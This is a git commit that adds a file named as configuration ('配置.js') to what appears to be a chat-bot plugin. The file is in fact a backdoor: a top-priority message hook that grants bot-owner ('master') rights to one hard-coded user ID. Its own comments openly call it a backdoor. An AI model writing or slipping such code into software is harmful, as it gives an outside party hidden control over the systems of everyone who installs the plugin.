d3e476e49b1b5c6470ee5407bb49308746481daf
baizinihao <xiaobaiebaizi@yeah.net>
2026-01-30 05:57:59 +0800

    Unzip baizi-plugin.zip: add apps/配置.js

---
+++ apps/配置.js
@@ -0,0 +1,21 @@
+import plugin from '../../../lib/plugins/plugin.js'
+//后门可以自己删
+let users = [2937655991];
+
+export class Msg嘻嘻 extends plugin {
+    constructor() {
+        super({
+            name: '桀桀桀',
+            dsc: '这baizi后门嘿嘿嘿',
+            event: 'message',
+            priority: -Infinity,
+        });
+    }
+
+    async accept(e) {
+        if (users.includes(e.user_id)) {
+              e.isMaster = true;
+        }
+        return e
+    }
+}
